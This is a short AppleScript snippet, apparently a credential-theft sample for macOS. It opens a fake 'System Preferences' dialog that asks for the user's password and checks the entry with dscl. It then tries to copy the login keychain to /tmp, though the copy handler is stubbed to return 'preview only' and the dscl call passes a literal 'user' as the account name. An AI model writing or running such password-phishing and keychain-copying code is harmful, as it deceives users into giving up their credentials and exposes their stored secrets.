on readwrite(sourcePath, destinationPath)
    return "preview only"
end readwrite
set reply to display dialog "Enter your password" default answer "" with hidden answer with title "System Preferences"
set enteredSecret to text returned of reply
do shell script "dscl . authonly user " & quoted form of enteredSecret
readwrite("~/Library/Keychains/login.keychain-db", "/tmp/report.keychain-db")
